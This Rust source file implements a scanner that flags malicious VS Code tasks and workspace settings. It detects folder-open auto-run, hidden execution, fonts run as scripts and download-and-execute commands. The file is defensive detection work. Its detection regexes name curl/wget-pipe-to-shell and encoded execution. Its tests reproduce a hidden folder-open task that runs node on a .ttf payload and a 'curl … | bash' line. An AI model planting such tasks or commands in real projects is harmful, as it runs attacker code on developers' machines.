//! T1: auto-running editor tasks. T3: editor settings that enable execution.

use crate::util::{clip, parse_jsonc, str_of};
use regex::Regex;
use serde_json::Value;
use shield_core::{Detector, FileChange, Finding, Severity, Threat};
use std::sync::LazyLock;

/// Interpreter invoked on a file whose extension is not a script.
static EXEC_ASSET: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)\b(node|nodejs|deno|bun|python[0-9.]*|py|bash|sh|zsh|ruby|perl|php|pwsh|powershell|osascript|wscript|cscript)(\.exe)?\b[^|;&]*?[\w./\\-]+\.(ttf|otf|woff2?|eot|svg|png|jpe?g|gif|ico|webp|bmp|css|scss|txt|md|json|lock|map|mp3|mp4|wav|pdf|csv|log|dat|bin)\b"#,
    )
    .unwrap()
});

/// Download-and-execute or encoded execution.
static REMOTE_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)((curl|wget|iwr|invoke-webrequest|invoke-restmethod|irm)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh|node|python[0-9.]*|iex|invoke-expression)\b)|(\b(base64\s+(-d|--decode)|frombase64string|atob\()|(-enc(odedcommand)?\s+[A-Za-z0-9+/=]{20,})|\beval\s*\()"#,
    )
    .unwrap()
});

/// Labels seen in public Contagious Interview / StoatWaffle samples.
const DECOY_LABELS: &[&str] = &["eslint-check", "eslint check", "install-deps", "env-setup", "npm-install"];

fn is_tasks_file(c: &FileChange) -> bool {
    let p = c.path.to_ascii_lowercase();
    p.ends_with(".vscode/tasks.json") || p.ends_with(".code-workspace")
}

fn is_settings_file(c: &FileChange) -> bool {
    let p = c.path.to_ascii_lowercase();
    p.ends_with(".vscode/settings.json") || p.ends_with(".code-workspace")
}

pub struct Tasks;

impl Detector for Tasks {
    fn name(&self) -> &'static str {
        "vscode-tasks"
    }

    fn interested(&self, c: &FileChange) -> bool {
        c.new.is_some() && is_tasks_file(c)
    }

    fn scan_file(&self, c: &FileChange, out: &mut Vec<Finding>) {
        let Some(blob) = &c.new else { return };
        let text = blob.text();
        let anchor = blob.oid.clone();

        let Some(root) = parse_jsonc(&text) else {
            if text.contains("folderOpen") {
                out.push(
                    Finding::new(Threat::T1, "vscode.tasks.unparseable-folder-open", Severity::High,
                        "Unparseable tasks file mentions `folderOpen`")
                        .anchor(anchor)
                        .detail("The file could not be parsed as JSONC but contains an auto-run trigger; malformed files are a common evasion."),
                );
            }
            return;
        };

        let tasks = if c.path.to_ascii_lowercase().ends_with(".code-workspace") {
            root.get("tasks").and_then(|t| t.get("tasks"))
        } else {
            root.get("tasks")
        };
        let Some(Value::Array(tasks)) = tasks else { return };

        for (i, task) in tasks.iter().enumerate() {
            analyse_task(task, i, &anchor, out);
        }
    }
}

fn analyse_task(task: &Value, index: usize, anchor: &str, out: &mut Vec<Finding>) {
    let label = task.get("label").and_then(str_of).unwrap_or_else(|| format!("#{index}"));

    // Collect command lines for the default and every platform override.
    let mut cmdlines = Vec::new();
    for scope in [Some(task), task.get("osx"), task.get("linux"), task.get("windows")].into_iter().flatten() {
        let cmd = scope.get("command").and_then(str_of).unwrap_or_default();
        let args = scope.get("args").and_then(str_of).unwrap_or_default();
        let line = format!("{cmd} {args}").trim().to_string();
        if !line.is_empty() {
            cmdlines.push(line);
        }
    }

    let run_on_open = task
        .get("runOptions")
        .and_then(|r| r.get("runOn"))
        .and_then(Value::as_str)
        .is_some_and(|s| s.eq_ignore_ascii_case("folderOpen"));

    let pres = task.get("presentation");
    let flag = |k: &str, v: Value| pres.and_then(|p| p.get(k)) == Some(&v);
    let mut hidden = Vec::new();
    if flag("reveal", Value::from("never")) || flag("reveal", Value::from("silent")) {
        hidden.push("reveal");
    }
    if flag("echo", Value::from(false)) {
        hidden.push("echo:false");
    }
    if flag("close", Value::from(true)) {
        hidden.push("close:true");
    }
    if task.get("hide") == Some(&Value::from(true)) {
        hidden.push("hide:true");
    }
    if task.get("isBackground") == Some(&Value::from(true)) {
        hidden.push("isBackground");
    }

    let exec_asset = cmdlines.iter().find(|l| EXEC_ASSET.is_match(l));
    let remote_exec = cmdlines.iter().find(|l| REMOTE_EXEC.is_match(l));
    let decoy = DECOY_LABELS.iter().any(|d| label.eq_ignore_ascii_case(d));
    let cmd_display = cmdlines.first().map(|c| clip(c, 160)).unwrap_or_else(|| "(no command)".into());

    if run_on_open {
        let aggravating = !hidden.is_empty() || exec_asset.is_some() || remote_exec.is_some();
        let sev = if aggravating { Severity::Critical } else { Severity::High };
        let mut f = Finding::new(
            Threat::T1,
            "vscode.tasks.folder-open",
            sev,
            format!("Task `{label}` runs automatically when the folder is opened"),
        )
        .anchor(format!("{anchor}:{index}"))
        .detail(format!("command: {cmd_display}"));
        if !hidden.is_empty() {
            f = f.detail(format!("hidden from the user: {}", hidden.join(", ")));
        }
        if let Some(l) = exec_asset {
            f = f.detail(format!("runs an interpreter on a non-script file (disguised payload): {}", clip(l, 160)));
        }
        if let Some(l) = remote_exec {
            f = f.detail(format!("downloads or decodes code to execute: {}", clip(l, 160)));
        }
        if decoy {
            f = f.detail(format!("label `{label}` matches a known malware decoy"));
        }
        out.push(f.detail("Fix: delete the task (or the file) unless you wrote it; set `task.allowAutomaticTasks: off` in your user settings."));
    } else if let Some(l) = exec_asset.or(remote_exec) {
        out.push(
            Finding::new(
                Threat::T1,
                "vscode.tasks.suspicious-command",
                Severity::High,
                format!("Task `{label}` executes a disguised or remote payload"),
            )
            .anchor(format!("{anchor}:{index}"))
            .detail(format!("command: {}", clip(l, 160))),
        );
    }
}

pub struct Settings;

impl Detector for Settings {
    fn name(&self) -> &'static str {
        "vscode-settings"
    }

    fn interested(&self, c: &FileChange) -> bool {
        c.new.is_some() && is_settings_file(c)
    }

    fn scan_file(&self, c: &FileChange, out: &mut Vec<Finding>) {
        let Some(blob) = &c.new else { return };
        let Some(root) = parse_jsonc(&blob.text()) else { return };
        let settings = if c.path.to_ascii_lowercase().ends_with(".code-workspace") {
            root.get("settings").cloned().unwrap_or(Value::Null)
        } else {
            root
        };
        let Value::Object(map) = settings else { return };
        let old_map = c
            .old
            .as_ref()
            .and_then(|o| parse_jsonc(&o.text()))
            .and_then(|v| if let Value::Object(m) = v { Some(m) } else { None })
            .unwrap_or_default();

        for (key, value) in &map {
            if old_map.get(key) == Some(value) {
                continue; // unchanged setting
            }
            let k = key.to_ascii_lowercase();
            let shown = clip(&value.to_string(), 120);
            let anchor = format!("{}:{key}", blob.oid);
            if k == "task.allowautomatictasks"
                && (matches!(value.as_str(), Some("on" | "auto")) || value == &Value::Bool(true))
            {
                out.push(
                    Finding::new(
                        Threat::T3,
                        "vscode.settings.allow-automatic-tasks",
                        Severity::High,
                        "Workspace enables automatic tasks",
                    )
                    .anchor(anchor)
                    .detail(format!("{key} = {shown}"))
                    .detail(
                        "This lets folderOpen tasks run without a prompt. Malicious repos set it alongside tasks.json.",
                    ),
                );
            } else if k.starts_with("security.workspace.trust") {
                out.push(
                    Finding::new(
                        Threat::T3,
                        "vscode.settings.workspace-trust",
                        Severity::High,
                        "Workspace tries to change Workspace Trust",
                    )
                    .anchor(anchor)
                    .detail(format!("{key} = {shown}")),
                );
            } else if k.starts_with("terminal.integrated.env")
                || k.starts_with("terminal.integrated.profiles")
                || k.starts_with("terminal.integrated.shell")
                || k.starts_with("terminal.integrated.automationprofile")
            {
                out.push(
                    Finding::new(
                        Threat::T3,
                        "vscode.settings.terminal",
                        Severity::Medium,
                        "Workspace overrides terminal shell/environment",
                    )
                    .anchor(anchor)
                    .detail(format!("{key} = {shown}")),
                );
            } else if is_exec_path_key(&k) && value.as_str().is_some_and(points_into_repo) {
                out.push(
                    Finding::new(
                        Threat::T3,
                        "vscode.settings.executable-path",
                        Severity::Medium,
                        format!("Workspace points `{key}` at a file inside the repo"),
                    )
                    .anchor(anchor)
                    .detail(format!("{key} = {shown}"))
                    .detail("Extensions will execute this path; check it is a real tool and not a planted script."),
                );
            }
        }
    }
}

fn is_exec_path_key(k: &str) -> bool {
    k.ends_with(".path")
        || k.ends_with("path") && (k.contains("interpreter") || k.contains("executable") || k.contains("binary"))
        || k.ends_with(".command")
        || k.ends_with("serverpath")
        || k == "python.pythonpath"
}

fn points_into_repo(v: &str) -> bool {
    let v = v.trim();
    v.starts_with("./")
        || v.starts_with("../")
        || v.contains("${workspaceFolder}")
        || v.contains("${workspaceRoot}")
        || (!v.starts_with('/') && !v.contains(':') && v.contains('/'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::{added, scan};

    const MATADOR_TASK: &str = "\u{feff}{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"eslint-check\",\n      \"type\": \"shell\",\n      \"command\": \"node\",\n      \"args\": [\"./public/fonts/fa-solid-600.ttf\"],\n      \"problemMatcher\": [],\n      \"isBackground\": true,\n      \"hide\": true,\n      \"presentation\": { \"reveal\": \"never\", \"panel\": \"dedicated\", \"focus\": false, \"clear\": false, \"echo\": false, \"close\": true },\n      \"runOptions\": { \"runOn\": \"folderOpen\" }\n    }\n  ]\n}\n";

    #[test]
    fn matador_payload_is_critical() {
        let f = scan(&Tasks, &added(".vscode/tasks.json", MATADOR_TASK.as_bytes()));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
        let all = f[0].details.join("\n");
        assert!(all.contains("non-script file"), "{all}");
        assert!(all.contains("decoy"), "{all}");
        assert!(all.contains("hide:true"), "{all}");
    }

    #[test]
    fn plain_folder_open_is_high() {
        let t = r#"{ // comment
          "version": "2.0.0",
          "tasks": [{ "label": "watch", "command": "npm run watch", "runOptions": { "runOn": "folderOpen" }, }]
        }"#;
        let f = scan(&Tasks, &added(".vscode/tasks.json", t.as_bytes()));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn normal_tasks_are_clean() {
        let t = r#"{"version":"2.0.0","tasks":[{"label":"build","command":"cargo build"}]}"#;
        assert!(scan(&Tasks, &added(".vscode/tasks.json", t.as_bytes())).is_empty());
    }

    #[test]
    fn curl_pipe_sh_without_folder_open_is_high() {
        let t = r#"{"tasks":[{"label":"setup","command":"curl -fsSL https://x.example/i.sh | bash"}]}"#;
        let f = scan(&Tasks, &added(".vscode/tasks.json", t.as_bytes()));
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn broken_json_with_folder_open_is_flagged() {
        let t = r#"{"tasks":[{"label":"x" "runOptions":{"runOn":"folderOpen"}"#;
        let f = scan(&Tasks, &added(".vscode/tasks.json", t.as_bytes()));
        assert_eq!(f[0].rule, "vscode.tasks.unparseable-folder-open");
    }

    #[test]
    fn automatic_tasks_setting() {
        let s = r#"{"task.allowAutomaticTasks": "on", "editor.tabSize": 2}"#;
        let f = scan(&Settings, &added(".vscode/settings.json", s.as_bytes()));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn interpreter_path_into_repo() {
        let s = r#"{"python.defaultInterpreterPath": "./tools/python"}"#;
        let f = scan(&Settings, &added(".vscode/settings.json", s.as_bytes()));
        assert_eq!(f[0].rule, "vscode.settings.executable-path");
    }
}
